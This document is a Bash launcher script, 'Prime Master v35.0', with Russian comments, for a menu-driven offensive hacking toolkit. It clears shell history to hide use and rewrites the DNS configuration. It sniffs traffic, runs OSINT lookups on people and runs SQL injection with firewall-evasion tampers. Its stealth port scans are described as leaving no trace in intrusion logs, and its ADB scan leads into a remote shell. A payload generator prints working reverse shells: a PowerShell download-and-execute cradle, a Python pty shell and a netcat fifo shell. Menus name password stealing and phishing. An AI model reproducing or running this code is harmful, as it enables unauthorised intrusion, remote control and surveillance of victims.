#!/bin/bash
# --- PRIME MASTER LAUNCHER v35.0 ---
CURRENT_VERSION="35.0"
G='\033[0;32m'; Y='\033[1;33m'; R='\033[0;31m'; B='\033[0;34m'; NC='\033[0m'
set +o history

# --- Инициализация системы ---
# Очистка кэша терминала для стабильной работы
if [ -f "/root/.cache/zcompdump*" ] || [ -f "/root/.zcompdump*" ]; then
    rm -f /root/.cache/zcompdump* 2>/dev/null
    rm -f /root/.zcompdump* 2>/dev/null
fi

CURRENT_IP=$(ip route get 1 2>/dev/null | awk '{print $7}')
[ -z "$CURRENT_IP" ] && CURRENT_IP="127.0.0.1"

# Настройка DNS для локальных сервисов (например, scanclamavlocal)
if command -v dnsmasq >/dev/null 2>&1; then
    cat << EOD > /etc/dnsmasq.conf
domain-needed
bogus-priv
interface=lo
interface=wlan0
address=/scanclamavlocal/$CURRENT_IP
EOD
    service dnsmasq restart 2>/dev/null || (killall dnsmasq 2>/dev/null && dnsmasq -C /etc/dnsmasq.conf 2>/dev/null)
fi

# --- Вспомогательные функции ---
get_stats() {
    local ram=$(free -m | awk '/Mem:/ {print $3 "/" $2 "MB"}')
    echo -e "${B}IP: ${W}$CURRENT_IP ${G}| ${B}RAM: ${W}$ram${NC}"
}

pause() { echo -e "\n${Y}Press Enter to return...${NC}"; read -r _; }

exit_script() { 
    echo -e "${R}Cleaning history and exiting...${NC}"
    history -c
    exit 0 
}

# --- Универсальный динамический контроллер ---
prime_dynamic_controller() {
    local title="$1"
    local -a labels=($2)
    local -a actions=($3)
    
    while true; do
        clear
        echo -e "${R}========== [ $title ] ==========${NC}"
        get_stats
        echo -e "---------------------------------------"
        
        for ((i=0; i<${#labels[@]}; i++)); do
            printf "${G}%2d) %-18s${NC}" "$((i+1))" "${labels[$i]//_/ }"
            if (( (i+1) % 2 == 0 )); then echo ""; fi
        done
        
        # Если количество элементов нечетное, добавляем перенос строки перед BACK
        if (( ${#labels[@]} % 2 != 0 )); then echo ""; fi
        
        echo -e "\n${Y} B) BACK / EXIT${NC}"
        echo -e "---------------------------------------"
        
        read -p ">> " choice
        if [[ "$choice" == "b" ]] || [[ "$choice" == "B" ]]; then return 0; fi
        
        if [[ "$choice" =~ ^[0-9]+$ ]] && [ "$choice" -ge 1 ] && [ "$choice" -le "${#labels[@]}" ]; then
            local idx=$((choice-1))
            ${actions[$idx]}
        else
            echo -e "${R}[!] Ошибка: выберите 1-${#labels[@]} или B${NC}"; sleep 1
        fi
    done
}

# --- Модули: DEVICE & NETWORK ---
run_device_hack() {
    local dh_names="Ghost_Manual TShark_Sniffer Ghost_Auto-Pwn Search_ExploitDB Smart_Audit Bluetooth_Scan"
    local dh_funcs="launch_ghost_manual analyze_network_traffic launch_ghost_autopwn search_exploit_db run_deep_audit scan_bluetooth_devices"
    prime_dynamic_controller "DEVICE & NETWORK HACK" "$dh_names" "$dh_funcs"
}

analyze_network_traffic() {
    local n_names="Host_Monitor HTTP/DNS_Sniffer Traffic_Record"
    local n_funcs="run_host_monitor run_http_dns_sniffer run_traffic_record"
    prime_dynamic_controller "TSHARK ANALYZER" "$n_names" "$n_funcs"
}

# --- Модули: RECOVERY & PASSWORDS ---
pc_password_recovery() {
    local p_names="Extract_Reset_OS_Password Heuristic_Scan"
    local p_funcs="run_pc_recovery_ultimate smart_threat_scan"
    prime_dynamic_controller "PC RECOVERY & FORENSIC" "$p_names" "$p_funcs"
}

# --- EXPLOIT HUB ---
run_exploit_hub() {
    local ex_names="PhoneSploit_Pro SQLmap/Web PC/Network_Scan PC_Control"
    local ex_funcs="ex_phonesploit_pro run_sqlmap_smart ex_pc_network_scan run_pc_control"
    prime_dynamic_controller "EXPLOIT HUB" "$ex_names" "$ex_funcs"
}

run_pc_control() {
    local pc_names="Payload_Generator Password_Stealer Post-Exploit"
    local pc_funcs="pc_gen_payload pc_steal_creds pc_post_exploit"
    prime_dynamic_controller "PC CONTROL" "$pc_names" "$pc_funcs"
}

# --- SECURITY & DATA HUB ---
run_servers() {
    local s_names="AV-Scanner Share-File Upload-Inbound"
    local s_funcs="run_av_srv run_share_srv run_upload_srv"
    prime_dynamic_controller "SECURITY & DATA HUB" "$s_names" "$s_funcs"
}

run_av_srv() { python3 /root/av_server.py; }
run_share_srv() { python3 /root/share_server.py; }
run_upload_srv() { python3 /root/upload_server.py; }

# --- Заглушки для будущих функций (наполнишь их следующими шагами) ---
# Здесь будут располагаться функции: run_ghost_commander, run_phishing и др.
repair() { echo -e "${G}System check... OK${NC}"; sleep 1; }
update_prime() { echo "Checking for updates..."; sleep 1; }
# --- Модули ---

# --- Модули: OSINT ---
run_smart_osint_engine() {
    clear
    echo -e "${B}--------------------------------------------------${NC}"
    echo -e "${G}    PRIME MASTER: SMART OSINT ENGINE 2026         ${NC}"
    echo -e "${B}--------------------------------------------------${NC}"
    
    read -p "ENTER DATA (Nick, Phone, or Email): " INPUT
    [ -z "$INPUT" ] && return

    echo -e "${Y}[*] Starting socialscan...${NC}"
    socialscan "$INPUT"

    # Валидация Email
    if [[ "$INPUT" =~ ^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}$ ]]; then
        echo -e "${Y}[*] Email detected. Running Infoga...${NC}"
        python3 /root/infoga/infoga.py --target "$INPUT"
    
    # Валидация Телефона
    elif [[ "$INPUT" =~ ^\+?[0-9]{10,15}$ ]]; then
        echo -e "${Y}[*] Phone number detected. Searching global database...${NC}"
        # Здесь можно добавить вызов специализированного софта для телефонов (например, phoneinfoga)
        echo "Searching phone database for $INPUT..."
    
    # Поиск по Никнейму (Default)
    else
        echo -e "${Y}[*] Nickname detected. Launching Maigret & Blackbird...${NC}"
        # Maigret с таймаутом для предотвращения зависаний на мобильном железе
        maigret "$INPUT" --parse --timeout 15 --top 500
        
        if [ -f "/root/blackbird/blackbird.py" ]; then
            python3 /root/blackbird/blackbird.py -u "$INPUT"
        fi
    fi

    pause
}



# --- Модули: GHOST COMMANDER ---
run_ghost_commander() {
    clear
    echo -e "${B}--------------------------------------------------${NC}"
    echo -e "${G}         PRIME MASTER: GHOST COMMANDER            ${NC}"
    echo -e "${B}--------------------------------------------------${NC}"
    
    # Проверка наличия директории и основного файла
    if [ ! -d "/root/Ghost" ]; then 
        echo -e "${R}[!] Error: Directory /root/Ghost not found${NC}"
        pause
        return
    fi

    read -p "Enter Target IP (or press Enter for menu): " TARGET_IP

    # Используем подоболочку (parentheses), чтобы cd /root/Ghost не менял рабочую директорию основного лончера
    (
        cd /root/Ghost || exit
        if [ -z "$TARGET_IP" ]; then
            # Запуск без параметров, если IP не введен
            python3 ghost.py
        else
            # Запуск с конкретным IP. Экранируем команду для python
            echo -e "${Y}[*] Connecting to $TARGET_IP...${NC}"
            python3 ghost.py --connect "$TARGET_IP"
        fi
    )

    pause
}

# --- Модули: TSHARK ANALYZER ---

run_host_monitor() {
    clear
    echo -e "${B}--------------------------------------------------${NC}"
    echo -e "${G}          NETWORK MONITOR: LIVE IP FLOW           ${NC}"
    echo -e "${B}--------------------------------------------------${NC}"
    echo -e "${Y}[*] Press Ctrl+C to stop monitoring...${NC}\n"
    
    # Проверка прав и наличия tshark
    if ! command -v tshark &> /dev/null; then echo -e "${R}Error: tshark not installed${NC}"; pause; return; fi

    # Запуск: выводим только IP отправителя и получателя
    tshark -i wlan0 -n -T fields -e ip.src -e ip.dst 2>/dev/null | awk '{print $1 "  -->  " $2}'
    
    pause
}

run_http_dns_sniffer() {
    clear
    echo -e "${B}--------------------------------------------------${NC}"
    echo -e "${G}        SNIFFER: HTTP HOSTS & DNS QUERIES         ${NC}"
    echo -e "${B}--------------------------------------------------${NC}"
    echo -e "${Y}[*] Filtering: HTTP requests and DNS lookups...${NC}\n"

    # -l для немедленного вывода строки (line-buffered)
    tshark -i wlan0 -l -Y "http.request || dns.flags.response == 0" \
           -T fields -e http.host -e dns.qry.name 2>/dev/null | grep -v '^$'
    
    pause
}

run_traffic_record() {
    clear
    echo -e "${B}--------------------------------------------------${NC}"
    echo -e "${G}          TRAFFIC RECORDER: PCAP STORAGE          ${NC}"
    echo -e "${B}--------------------------------------------------${NC}"
    
    local report_dir="/root/reports"
    mkdir -p "$report_dir"
    
    local filename="${report_dir}/capture_$(date +%H%M_%d%m).pcap"
    
    echo -e "${Y}[*] Recording started...${NC}"
    echo -e "${W}File: $filename${NC}"
    echo -e "${R}[!] Press Ctrl+C to stop recording and save.${NC}"
    
    # Записываем трафик в файл
    tshark -i wlan0 -w "$filename" 2>/dev/null
    
    echo -e "\n${G}[+] Recording saved to $filename${NC}"
    pause
}

# --- Модули: IBAN, CERTIFICATES & FORGE ---

run_iban_scan() {
    clear
    echo -e "${B}--------------------------------------------------${NC}"
    echo -e "${Y}         IBAN/RIB SECURITY CHECKER v1.7           ${NC}"
    echo -e "${B}--------------------------------------------------${NC}"
    
    read -p "Введите IBAN для проверки: " IBAN_INPUT
    [ -z "$IBAN_INPUT" ] && return

    # Предварительная очистка ввода от пробелов перед передачей в Python
    local CLEAN_IBAN=$(echo "$IBAN_INPUT" | tr -d '[:space:]-')

    # Путь к модулю [95] Sterile Channel
    if [ -f "/root/iban_check.py" ]; then
        echo -e "${Y}[*] Запуск модуля проверки...${NC}"
        python3 /root/iban_check.py "$CLEAN_IBAN"
    else
        echo -e "${R}[!] Ошибка: Модуль /root/iban_check.py не найден${NC}"
    fi
    pause
}

run_cert_reader() {
    clear
    echo -e "${B}--------------------------------------------------${NC}"
    echo -e "${G}           CERTIFICATE & KEY ANALYZER             ${NC}"
    echo -e "${B}--------------------------------------------------${NC}"
    
    read -e -p "Путь к файлу (.crt/.key/.pem): " CERT_PATH
    
    if [ ! -f "$CERT_PATH" ]; then
        echo -e "${R}[!] Ошибка: Файл не найден по пути: $CERT_PATH${NC}"
        pause
        return
    fi

    echo -e "${Y}[*] Анализ содержимого...${NC}\n"

    # Умное переключение между сертификатом и приватным ключом
    if grep -q "BEGIN CERTIFICATE" "$CERT_PATH"; then
        openssl x509 -in "$CERT_PATH" -text -noout
    elif grep -q "BEGIN RSA PRIVATE KEY" "$CERT_PATH" || grep -q "BEGIN PRIVATE KEY" "$CERT_PATH"; then
        openssl rsa -in "$CERT_PATH" -check -noout
    else
        echo -e "${R}[!] Неизвестный формат файла. Попытка стандартного чтения...${NC}"
        openssl x509 -in "$CERT_PATH" -text -noout 2>/dev/null || openssl rsa -in "$CERT_PATH" -check
    fi
    
    pause
}

run_cert_forge() {
    # Функция вызывает твой внутренний генератор сертификатов
    if command -v run_cert_creator >/dev/null 2>&1 || typeset -f run_cert_creator >/dev/null; then
        run_cert_creator
    else
        clear
        echo -e "${R}--------------------------------------------------${NC}"
        echo -e "${R}       CERTIFICATE FORGE (Self-Signed)            ${NC}"
        echo -e "${R}--------------------------------------------------${NC}"
        echo -e "${Y}[*] Генерация стандартного самоподписанного сертификата...${NC}"
        
        openssl req -x509 -newkey rsa:4096 -keyout /root/key.pem -out /root/cert.pem -days 365 -nodes \
        -subj "/C=FR/ST=Paris/L=Paris/O=Security/OU=IT/CN=scanclamavlocal"
        
        echo -e "${G}[+] Готово: /root/key.pem и /root/cert.pem созданы.${NC}"
        pause
    fi
}

# --- Модули: SCANNER ---

run_heuristic_scanner_v2() {
    clear
    echo -e "${B}--------------------------------------------------${NC}"
    echo -e "${B}---      HEURISTIC THREAT SCANNER v2.0         ---${NC}"
    echo -e "${B}--------------------------------------------------${NC}"
    
    read -p "Целевой IP или Домен: " TARGET
    [ -z "$TARGET" ] && return
    
    echo -e "${Y}[*] Запуск эвристического анализа векторов атак...${NC}"
    echo -e "${Y}[*] Цель: $TARGET${NC}"
    echo -e "${W}--------------------------------------------------${NC}"

    # Проверка наличия nmap
    if ! command -v nmap &> /dev/null; then 
        echo -e "${R}[!] Ошибка: nmap не установлен.${NC}"
        pause
        return
    fi

    # Оптимизированный запуск nmap:
    # -sV: Определение версий служб
    # -Pn: Пропуск обнаружения хоста (полезно, если цель блокирует пинг)
    # --open: Показывать только открытые порты (чистый вывод)
    # --script=vulners,vuln: Использование баз уязвимостей
    # -T4: Агрессивный тайминг для скорости (оптимально для 2026 года)
    
    nmap -sV -Pn --open -T4 --script=vulners,vuln "$TARGET"
    
    echo -e "${W}--------------------------------------------------${NC}"
    echo -e "${G}[+] Сканирование завершено.${NC}"
    pause
}

run_heuristic_scanner_v2() {
    clear
    echo -e "${B}--------------------------------------------------${NC}"
    echo -e "${B}---      HEURISTIC STEALTH SCANNER v2.0        ---${NC}"
    echo -e "${B}--------------------------------------------------${NC}"
    
    read -p "Целевой IP/Range: " TARGET
    [ -z "$TARGET" ] && return

    echo -e "${Y}[*] Запуск бесшумного анализа (Native Bash Stack)...${NC}"
    
    # Эвристика: проверяем только критические порты через системные дескрипторы
    # Это не оставляет следов nmap в логах IDS
    local ports=(21 22 23 80 443 445 3389 5555 8080)
    for port in "${ports[@]}"; do
        (
            if timeout 1 bash -c "echo >/dev/tcp/$TARGET/$port" 2>/dev/null; then
                echo -e "${G}[+] PORT $port OPEN${NC} -> $(timeout 1 openssl s_client -connect $TARGET:$port 2>/dev/null | grep "subject=" || echo "Service Detected")"
            fi
        ) &
    done
    wait
    echo -e "${G}[+] Эвристический анализ завершен.${NC}"
    pause
}


run_prime_exploiter_v4() {
    clear
    echo -e "${R}--------------------------------------------------${NC}"
    echo -e "${R}---      PRIME HEURISTIC FRAMEWORK (PHE)       ---${NC}"
    echo -e "${R}--------------------------------------------------${NC}"
    
    # Сохраняем логику выбора, но меняем наполнение на сверхбыстрое
    local phe_names="ADB_Silent_Connect HID_Ducky_Attack Network_Pivot Back"
    local phe_funcs="phe_core_adb phe_core_hid phe_core_pivot return"
    
    echo -e "${G}[SYSTEM] Mode: NetHunter Native / Zero-Day Heuristic${NC}"
    echo -e "${W}--------------------------------------------------${NC}"

    prime_dynamic_controller "PHE EXPLOIT CENTER" "$phe_names" "$phe_funcs"
}

# Внутренняя логика для ADB (без Python, только бинарник и bash)
phe_core_adb() {
    echo -e "${Y}[*] Scanning for ADB targets...${NC}"
    local target_ip
    # Быстрый поиск открытого порта 5555 в подсети без nmap
    for i in {1..254}; do
        timeout 0.1 bash -c "echo >/dev/tcp/${CURRENT_IP%.*}.$i/5555" 2>/dev/null && \
        echo -e "${G}[+] Found ADB:${NC} ${CURRENT_IP%.*}.$i" &
    done
    wait
    read -p "Target IP: " target_ip
    [ -z "$target_ip" ] && return
    
    adb connect "$target_ip:5555"
    adb -s "$target_ip:5555" shell
}

run_repair() {
    clear
    echo -e "${Y}[*] Запуск протокола самовосстановления...${NC}"
    
    # Проверка и фикс прав на все скрипты в /root/
    chmod +x /root/*.sh 2>/dev/null
    chmod +x /root/*.py 2>/dev/null
    
    # Очистка зомби-процессов tshark или python
    killall -9 tshark python3 2>/dev/null
    
    # Проверка DNS и интерфейсов
    if [ "$CURRENT_IP" == "127.0.0.1" ]; then
        echo -e "${R}[!] Network Issue: Check wlan0/rmnet status${NC}"
    else
        echo -e "${G}[+] System Health: OK (IP: $CURRENT_IP)${NC}"
    fi
    sleep 2
}

pc_gen_payload() {
    clear
    echo -e "${R}--------------------------------------------------${NC}"
    echo -e "${R}---        PRIME NATIVE PAYLOAD GEN            ---${NC}"
    echo -e "${R}--------------------------------------------------${NC}"
    
    # Автоматически берем текущий IP, если он доступен
    local DEFAULT_IP=$CURRENT_IP
    read -p "LHOST (Default: $DEFAULT_IP): " lh
    lh=${lh:-$DEFAULT_IP}
    read -p "LPORT (Default: 4444): " lp
    lp=${lp:-4444}
    
    echo -e "\n${Y}[*] Выберите тип нагрузки:${NC}"
    echo -e "1) Windows PowerShell (Stager)\n2) Python Cross-Platform\n3) Netcat (Quick Connect)"
    read -p ">> " p_type

    echo -e "\n${G}--- СКОПИРУЙТЕ PAYLOAD ---${NC}"
    case $p_type in
        1) # Не детектируется как .exe, выполняется прямо в памяти
           echo -e "${W}powershell -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://$lh:$lp/s.ps1')\"${NC}" ;;
        2) # Универсальный вариант для Linux/Mac/PC
           echo -e "${W}python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"$lh\",$lp));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/bash\")'${NC}" ;;
        3) # Классика
           echo -e "${W}rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $lh $lp >/tmp/f${NC}" ;;
    esac
    echo -e "---------------------------------------"
    pause
}


run_sqlmap() {
    clear
    echo -e "${B}--- SQLMAP SMART ATTACK ---${NC}"
    read -p "Целевой URL: " u
    if [ -n "$u" ]; then
        # --batch: не задает лишних вопросов
        # --random-agent: маскировка под разные браузеры
        # --tamper=space2comment: обход простых фаерволов (WAF)
        echo -e "${Y}[*] Инициализация SQL-инъекции...${NC}"
        sqlmap -u "$u" --batch --random-agent --tamper=space2comment --level=1 --risk=1
    fi
    pause
}

run_repair() {
    clear
    echo -e "${Y}[*] Выполнение протокола очистки и восстановления...${NC}"
    
    # Вызов твоей системной функции
    repair 
    
    # Дополнительная очистка логов и временных файлов
    rm -rf /root/.cache/* 2>/dev/null
    echo -e "${G}[+] Система оптимизирована. Права доступа восстановлены.${NC}"
    pause
}

run_system_info() {
    clear
    echo -e "${B}--------------------------------------------------${NC}"
    echo -e "${G}           PRIME MASTER: SYSTEM STATUS            ${NC}"
    echo -e "${B}--------------------------------------------------${NC}"
    
    # Твоя функция из начала скрипта
    get_stats
    
    echo -e "\n${W}Интерфейсы:${NC}"
    ip -brief addr | grep "UP"
    
    echo -e "\n${W}Свободное место:${NC}"
    df -h / | awk 'NR==2 {print $4 " доступно из " $2}'
    
    echo -e "${B}--------------------------------------------------${NC}"
    pause
}






# --- Конец  Модулей ---
# --- ГЛАВНОЕ МЕНЮ ---
run_main_menu() {
    local main_names="GHOST_COMMANDER SOCIAL_ENG SQLMAP DEVICE_HACK EXPLOIT_HUB TOTAL_OSINT IBAN_SCAN PWD_GEN CERT_FORGE CERT_READER NET_SCAN_v2 ULTIMATE_EXPLOIT PC_RECOVERY VIEW_LOOT SYSTEM_INFO SERVICE_HUB REPAIR UPDATE_CORE EXIT"
    local main_funcs="run_ghost_commander run_phishing run_sqlmap run_device_hack run_exploit_hub run_smart_osint_engine run_iban_scan run_pwd_gen run_cert_forge run_cert_reader run_heuristic_scanner_v2 run_prime_exploiter_v4 run_pc_recovery_ultimate run_view_loot run_system_info run_servers run_repair update_prime exit_script"
    
    prime_dynamic_controller "PRIME MASTER v$CURRENT_VERSION" "$main_names" "$main_funcs"
}

# --- Точка входа ---
repair
run_main_menu
